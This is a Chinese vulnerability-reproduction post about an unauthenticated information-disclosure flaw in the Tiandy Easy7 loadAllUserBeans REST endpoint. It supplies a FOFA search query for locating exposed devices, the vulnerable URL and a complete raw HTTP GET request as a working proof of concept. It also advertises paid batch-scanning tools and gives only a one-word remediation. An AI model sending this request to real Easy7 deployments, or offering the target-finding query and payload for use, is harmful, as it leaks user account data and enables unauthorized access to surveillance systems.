#  天地伟业Easy7 loadAllUserBeans接口存在敏感信息泄露 附POC  
2026-3-11更新
                    2026-3-11更新  南风漏洞复现文库   2026-03-11 15:45  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 天地伟业Easy7简介  
  
微信公众号搜索：南风漏洞复现文库  
  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
天地伟业Easy7  
## 2.漏洞描述  
  
天地伟业Easy7 loadAllUserBeans接口存在敏感信息泄露  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
天地伟业Easy7  
  
![天地伟业Easy7 loadAllUserBeans接口存在敏感信息泄露](https://mmbiz.qpic.cn/sz_mmbiz_png/b9KQYsB8q6wB7ZKT5GJVkeFR2SPx1ueNhNicsDzn03513uPiaYfwKuc9EZ1N8REQ1iam0Lq4Oj856FYryvR3qiaqSdDhdoBjXw5z9DwrAIhTjY8/640?wx_fmt=png&from=appmsg "null")  
  
天地伟业Easy7 loadAllUserBeans接口存在敏感信息泄露  
## 4.fofa查询语句  
  
app="Tiandy-Easy7"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/Easy7/rest/user/loadAllUserBeans  
  
漏洞数据包：  
```
GET /Easy7/rest/user/loadAllUserBeans HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yIjtVKCicZXfNDhGFjJCXFcbzkxL4icicQmAATf0Mzh0tyPs11WOLwmfWIELgdj0Rqvgs0ys2UO7KHSlKNpVnASCuG0SYxvzKkXE/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
  
  
2: 免登录，免费fofa查询。  
  
  
3: 更新其他实用网络安全工具项目。  
  
  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xG092Tic4iaicDpHaH66HjD8mjOr0bTUbXdM0wgDxQSmdwibs17sa8Uq5ib99uYib198VR0XcibKNaEXZChefGeCoPAZkCZDiauTRWxEw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wPfaVzNKEEMvGOYqJbibPs3mE386DUZWamsh45pqcNDMNibqmXys2bDmW3GVDGYHib801NrmLqbbdonb84BGLBsMe0QOZ4NyIAmo/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6x5exI6knZRzvHZgTyV6R7F9ib6g702ibf5ZPly30PPdueh5ksibQZygOAMXbYJahU2MsYB4P9qcqnhKI1pBG7sEaiaaASzzxet4Rk/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6w2j4OtUJdX9icJyyINiaFV0ic3ods7xDzG75nk9koiaGznuCQqzPZqRJpBicw321xl1aXgJUCMubs2Cm2CPLHGibEfU5whx8e76A3gw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xeUf7tTgicMXbHVMa6iaqxzV4icnicgZXvZ1IwLDVVl0HLFr12gevV9I3lkXwnDn4w4wPsUk7mTMicwYPTS6ibkgN2W7BX7G8tTxVJc/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wpLuMRoRyzkZLWd5EvlQxYLmKQD6jsmiaUKu9lJg9uxRnJR9EzIwU7fh5SsyszJabicCfbQLIXiasRNFHbibqfIbpPjCyDcc2Y7Ow/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
